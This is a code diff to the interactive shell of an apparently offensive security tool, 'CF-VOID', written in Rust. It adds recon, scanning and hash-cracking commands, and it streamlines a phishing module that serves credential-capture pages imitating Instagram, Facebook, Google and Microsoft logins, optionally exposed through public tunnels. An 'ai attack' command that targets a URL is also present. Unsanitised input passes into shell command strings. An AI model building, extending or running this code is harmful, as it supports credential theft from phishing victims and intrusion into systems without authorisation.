@@ -116,10 +116,8 @@ fn process_shell_command(input: &str) {
         }
         "recon" | "r" => {
             if args_str.is_empty() {
-                banner::error("Usage: recon <domain/ip>");
-                banner::info("Commands: subdomain <domain> | dns <domain> | ping <host> | iplookup <ip>");
-                banner::info("          netscan <cidr> | ports <host> | services <host> | whois <domain>");
-                banner::info("          headers <url> | techstack <url>");
+                banner::error("Usage: recon <subcommand> <target>");
+                banner::info("Subcommands: subdomain, dns, ping, iplookup, netscan, ports, services, whois, headers, techstack");
                 return;
             }
             let parts2: Vec<&str> = args_str.split_whitespace().collect();
@@ -129,6 +127,7 @@ fn process_shell_command(input: &str) {
                 "dns" => run_tool_command(&format!("--osint-subdomains --target {}", target)),
                 "ping" => run_system_command(&format!("ping -c 4 {}", target)),
                 "iplookup" | "ipinfo" => {
+                    let _ = run_system_command("curl");
                     let result = std::process::Command::new("curl")
                         .arg("-s").arg(format!("https://ipapi.co/{}/json/", target))
                         .output();
@@ -145,6 +144,51 @@ fn process_shell_command(input: &str) {
                 _ => run_tool_command(args_str),
             }
         }
+        // Standalone recon commands
+        "subfinder" | "subdomains" | "subs" => {
+            if args_str.is_empty() {
+                banner::error("Usage: subfinder <domain>");
+                return;
+            }
+            let domain = args_str.trim_start_matches("https://").trim_start_matches("http://").trim_end_matches('/');
+            run_tool_command(&format!("--subdomain-brute --target {}", domain));
+        }
+        "dns" => {
+            if args_str.is_empty() {
+                banner::error("Usage: dns <domain>");
+                return;
+            }
+            let domain = args_str.trim_start_matches("https://").trim_start_matches("http://").trim_end_matches('/');
+            run_tool_command(&format!("--osint-subdomains --target {}", domain));
+        }
+        "ping" => {
+            if args_str.is_empty() { banner::error("Usage: ping <host>"); return; }
+            let host = args_str.trim_start_matches("https://").trim_start_matches("http://").trim_end_matches('/');
+            run_system_command(&format!("ping -c 4 {}", host));
+        }
+        "iplookup" | "ipinfo" => {
+            if args_str.is_empty() { banner::error("Usage: iplookup <ip>"); return; }
+            let ip = args_str.trim();
+            let _ = run_system_command("curl");
+            let result = std::process::Command::new("curl")
+                .arg("-s").arg(format!("https://ipapi.co/{}/json/", ip))
+                .output();
+            if let Ok(o) = result {
+                println!("{}", String::from_utf8_lossy(&o.stdout));
+            }
+        }
+        "whois" => {
+            if args_str.is_empty() { banner::error("Usage: whois <domain>"); return; }
+            run_system_command(&format!("whois {}", args_str));
+        }
+        "headers" => {
+            if args_str.is_empty() { banner::error("Usage: headers <url>"); return; }
+            run_system_command(&format!("curl -sI {}", args_str));
+        }
+        "techstack" | "tech" => {
+            if args_str.is_empty() { banner::error("Usage: techstack <url>"); return; }
+            run_system_command(&format!("whatweb -v {}", args_str));
+        }
         "crack" | "c" => {
             if args_str.is_empty() {
                 banner::error("Usage: crack --crack-hash <hash> --hash-type md5");
@@ -159,12 +203,45 @@ fn process_shell_command(input: &str) {
             }
             run_tool_command(args_str);
         }
-        "network" | "n" => {
-            if args_str.is_empty() {
-                banner::error("Usage: network -t <ip> --ports quick");
+        "network" | "n" | "net" => {
+            let args_vec: Vec<&str> = args_str.split_whitespace().collect();
+            if args_vec.is_empty() {
+                banner::error("Usage: network -t <ip/cidr> --ports quick");
+                banner::info("Examples: network -t 192.168.1.1 --ports quick");
+                banner::info("          network -t 192.168.1.0/24 --ports syn");
                 return;
             }
-            run_tool_command(args_str);
+            // Parse -t and --target
+            let mut target = String::new();
+            let mut remaining: Vec<String> = Vec::new();
+            let mut i = 0;
+            while i < args_vec.len() {
+                if (args_vec[i] == "-t" || args_vec[i] == "--target") && i + 1 < args_vec.len() {
+                    target = args_vec[i + 1].to_string();
+                    i += 2;
+                    continue;
+                }
+                remaining.push(args_vec[i].to_string());
+                i += 1;
+            }
+
+            if target.is_empty() {
+                // Try to use the first non-flag argument as target
+                for arg in &args_vec {
+                    if !arg.starts_with('-') {
+                        target = arg.to_string();
+                        break;
+                    }
+                }
+            }
+
+            if target.is_empty() {
+                banner::error("Error: No target specified. Use -t <ip/cidr>");
+                return;
+            }
+
+            let cmd = format!("-t {} {}", target, remaining.join(" "));
+            run_tool_command(&cmd);
         }
         "listen" | "l" => {
             if args_str.is_empty() {
@@ -177,54 +254,59 @@ fn process_shell_command(input: &str) {
         "phish" | "phishing" => {
             let parts: Vec<&str> = args_str.split_whitespace().collect();
             if parts.is_empty() {
-                banner::error("Usage: phish serve <template> [--tunnel <type>] [--port <port>]");
-                banner::info("Templates: login, instagram, facebook, google, microsoft, etc.");
+                banner::error("Usage: phish serve <template> | phish <template>");
+                banner::info("Examples: phish instagram  |  phish serve google --tunnel cloudflared");
+                banner::info("Templates: login, instagram, facebook, google, microsoft, etc. (see list-templates)");
                 banner::info("Tunnels: cloudflared, localtunnel, serveo");
                 return;
             }
             let subcommand = parts[0];
+
+            // Check if first arg is a known subcommand
             match subcommand {
                 "serve" | "s" => {
                     let template = parts.get(1).map(|s| s.to_string()).unwrap_or("login".to_string());
                     let mut port: u16 = 8080;
                     let mut tunnel: Option<String> = None;
                     for (i, p) in parts.iter().enumerate() {
-                        if *p == "--tunnel" && i + 1 < parts.len() {
-                            tunnel = Some(parts[i + 1].to_string());
-                        }
-                        if *p == "--port" && i + 1 < parts.len() {
-                            port = parts[i + 1].parse().unwrap_or(8080);
-                        }
+                        if *p == "--tunnel" && i + 1 < parts.len() { tunnel = Some(parts[i + 1].to_string()); }
+                        if *p == "--port" && i + 1 < parts.len() { port = parts[i + 1].parse().unwrap_or(8080); }
                     }
                     let mut server = crate::phishing::PhishingServer::new("0.0.0.0", port, &template);
-                    if let Some(t) = tunnel {
-                        server = server.with_tunnel(&t);
-                    }
+                    if let Some(t) = tunnel { server = server.with_tunnel(&t); }
                     banner::info(&format!("Starting phishing server with template '{}' on port {}", template, port));
                     let _ = server.start();
                 }
-                "template" | "t" => {
+                "template" | "gen" | "g" => {
                     let template = parts.get(1).map(|s| s.to_string()).unwrap_or("login".to_string());
                     let gen = crate::phishing::PhishingGen::new();
                     match gen.generate(&template, "0.0.0.0", "8080", None) {
                         Some(path) => {
                             banner::success(&format!("Phishing page generated: {}", path));
-                            banner::info("Host with: python3 -m http.server 8080");
-                            banner::info("Capture at: http://0.0.0.0:8080/capture (use phish serve instead)");
+                            banner::info(&format!("To serve: phish serve {}", template));
                         }
                         None => banner::error(&format!("Unknown template: {}. Use list-templates", template)),
                     }
                 }
+                "list" | "templates" => {
+                    crate::phishing::PhishingGen::list_templates();
+                }
                 _ => {
-                    // Try as template name directly: "phish instagram"
+                    // Treat as template name - auto generate AND serve
                     let template = subcommand.to_string();
-                    let gen = crate::phishing::PhishingGen::new();
-                    match gen.generate(&template, "0.0.0.0", "8080", None) {
-                        Some(path) => {
-                            banner::success(&format!("Phishing page generated: {}", path));
-                            banner::info(&format!("To capture credentials, run: phish serve {}", template));
-                        }
-                        None => banner::error(&format!("Unknown template: {}. Use list-templates to see available.", template)),
+                    let check = crate::phishing::PhishingGen::new();
+                    // Quick check if template exists by trying to generate
+                    if check.generate(&template, "0.0.0.0", "8080", Some("phishing_tmp_check")) != None {
+                        let _ = std::fs::remove_dir_all("phishing_tmp_check");
+                        // Auto-start server
+                        let port: u16 = parts.iter().position(|&p| p == "--port").and_then(|i| parts.get(i+1).and_then(|s| s.parse().ok())).unwrap_or(8080);
+                        let tunnel: Option<String> = parts.iter().position(|&p| p == "--tunnel").and_then(|i| parts.get(i+1).map(|s| s.to_string()));
+                        let mut server = crate::phishing::PhishingServer::new("0.0.0.0", port, &template);
+                        if let Some(t) = tunnel { server = server.with_tunnel(&t); }
+                        banner::info(&format!("Auto-generating and serving '{}' on port {}", template, port));
+                        let _ = server.start();
+                    } else {
+                        banner::error(&format!("Unknown template: {}. Use list-templates to see available.", template));
                     }
                 }
             }
@@ -235,23 +317,19 @@ fn process_shell_command(input: &str) {
                 banner::info("Phishing server - credential capture with powers");
                 banner::info("Usage: serve <template> [--port <port>] [--tunnel <type>]");
                 banner::info("Templates: login, instagram, facebook, google, etc. (see list-templates)");
+                banner::info("Tunnels: cloudflared, localtunnel, serveo");
                 return;
             }
             let template = parts[0].to_string();
             let mut port: u16 = 8080;
             let mut tunnel: Option<String> = None;
             for (i, p) in parts.iter().enumerate() {
-                if *p == "--tunnel" && i + 1 < parts.len() {
-                    tunnel = Some(parts[i + 1].to_string());
-                }
-                if *p == "--port" && i + 1 < parts.len() {
-                    port = parts[i + 1].parse().unwrap_or(8080);
-                }
+                if *p == "--tunnel" && i + 1 < parts.len() { tunnel = Some(parts[i + 1].to_string()); }
+                if *p == "--port" && i + 1 < parts.len() { port = parts[i + 1].parse().unwrap_or(8080); }
             }
             let mut server = crate::phishing::PhishingServer::new("0.0.0.0", port, &template);
-            if let Some(t) = tunnel {
-                server = server.with_tunnel(&t);
-            }
+            if let Some(t) = tunnel { server = server.with_tunnel(&t); }
+            banner::info(&format!("Starting phishing server with template '{}' on port {}", template, port));
             let _ = server.start();
         }
         "tui" => {
@@ -277,7 +355,7 @@ fn process_shell_command(input: &str) {
             println!("  {} CF-VOID v{}", tc("▐", GOLD), crate::VERSION);
             println!("  {} IND 'CYBER-FORCE' :: Offensive Security Platform", tc("➥", TEAL));
         }
-        "ls" | "pwd" | "cd" | "cat" | "echo" | "mkdir" | "rm" | "cp" | "mv" | "chmod" | "grep" | "find" | "whoami" | "ifconfig" | "ping" | "curl" | "wget" => {
+        "ls" | "pwd" | "cd" | "cat" | "echo" | "mkdir" | "rm" | "cp" | "mv" | "chmod" | "grep" | "find" | "whoami" | "ifconfig" | "curl" | "wget" => {
             // Run as system command
             run_system_command(input);
         }
@@ -351,15 +429,16 @@ fn handle_ai_command_string(args: &str) {
             });
         }
         "attack" => {
-            if parts.len() < 3 {
+            if parts.len() < 2 {
                 banner::error("Usage: ai attack <url> [provider]");
                 banner::info("Example: ai attack https://example.com cerebras");
+                banner::info("Default provider: cerebras");
                 return;
             }
             let url = parts[1].to_string();
             let provider = parts.get(2).map(|s| s.to_lowercase()).unwrap_or_else(|| "cerebras".to_string());
             
-            banner::info("Starting AI attack...");
+            banner::info(&format!("Starting AI attack on {} with provider '{}'...", url, provider));
             std::thread::spawn(move || {
                 let rt = tokio::runtime::Runtime::new().unwrap();
                 rt.block_on(async {
